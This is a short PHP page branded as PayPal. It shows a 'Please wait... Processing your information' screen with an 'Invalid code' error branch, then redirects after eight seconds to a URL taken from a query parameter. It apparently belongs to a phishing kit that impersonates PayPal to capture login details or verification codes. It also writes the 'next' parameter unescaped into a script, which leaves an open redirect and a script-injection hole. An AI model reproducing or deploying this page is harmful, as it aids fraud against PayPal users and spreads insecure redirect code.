<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paypal</title>
    <link rel="stylesheet" href="res/css/main.css">
</head>
<body>
    
    <div class="container">       

        <div class="login">

            <img src="res/img/logo.png" class="logo">

            <h2>Please wait...</h2>
            <p>Processing your information...</p>
           <img src="res/img/loadin.gif">
        
            <?php 
            if(isset($_GET['error'])){
            echo '<input type="hidden" name="exit">';
            echo '<p style="color:red;">Invalid code. Please try</p>';
            }
            ?>
            
        
        </div>
    </div>
    <script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script> 
</body>
</html>
